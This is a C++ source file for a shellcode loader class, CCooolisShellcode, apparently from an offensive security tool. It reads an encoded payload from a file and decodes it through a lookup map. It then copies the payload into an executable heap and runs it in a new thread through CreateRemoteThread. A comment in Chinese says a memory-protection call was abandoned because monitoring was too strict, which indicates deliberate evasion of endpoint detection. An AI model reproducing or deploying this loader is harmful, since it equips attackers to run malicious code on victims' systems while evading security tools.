#include "Cooolis-Shellcode.h"

CCooolisShellcode::CCooolisShellcode()
{
	for (INT i = 0; i < SHELLCODE_MAP_LEN; i++)
	{
		this->ShellcodeMap.insert(std::pair<std::string, BYTE>(SHELLCODE_MAP_STR[i], SHELLCODE_MAP_HEX[i]));
	}
}

CCooolisShellcode::~CCooolisShellcode()
{
	if(pFileMemory)
		HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, pFileMemory);
}

DWORD CCooolisShellcode::LoadeShellcodeFile(std::string filename)
{
	DWORD dwFileSize = 0;
	DWORD dwNumberToReaded = 0;
	HANDLE hFile = CreateFileA(filename.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return 0;
	}
	dwFileSize = GetFileSize(hFile, NULL);
	if (dwFileSize == 0)
		return 0;
	// std::cout << "[*] Shellcode FileSize : " << dwFileSize << " Bytes." << std::endl;
	this->pFileMemory = (PBYTE)CooolisHeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
	if (!ReadFile(hFile, pFileMemory, dwFileSize, &dwNumberToReaded, NULL)) {
		return 0;
	}

	CloseHandle(hFile);

	return dwFileSize;
}

VOID CCooolisShellcode::ConvertShellcodeByCHAR(DWORD dwSize)
{
	this->dwShellcodeSize = dwSize/4;
	std::string sCodeString  = "";
	// 申请内存
	HANDLE hCooolisHeap = CooolisHeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0);
	this->Shellcode = (PBYTE)CooolisHeapAlloc(hCooolisHeap, 0, dwShellcodeSize);
	// this->Shellcode = new BYTE[dwShellcodeSize];
	// this->Shellcode = (PBYTE)CooolisVirtualAlloc(NULL, dwShellcodeSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);

	for (INT x = 0, y = 1, z = 0; x < dwSize; x++)
	{

		sCodeString += this->pFileMemory[x];
		if (y == 4) {
			this->Shellcode[z] = this->ShellcodeMap[sCodeString];
			sCodeString.clear();
			y = 0;
			z++;
		}
		y++;
	}

	return VOID();
}

VOID CCooolisShellcode::CreateThreadRun()
{
	DWORD dwOldProtect = NULL;
	// 监控太严格啦！ 洒家不用你了！
	// CooolisVirtualProtect(this->Shellcode, this->dwShellcodeSize, PAGE_EXECUTE, &dwOldProtect);
	HANDLE hThread = CooolisCreateRemoteThread(GetCurrentProcess(), NULL, NULL, (LPTHREAD_START_ROUTINE)this->Shellcode, NULL, NULL, NULL);
	WaitForSingleObject(hThread, INFINITE);
	return VOID();
}
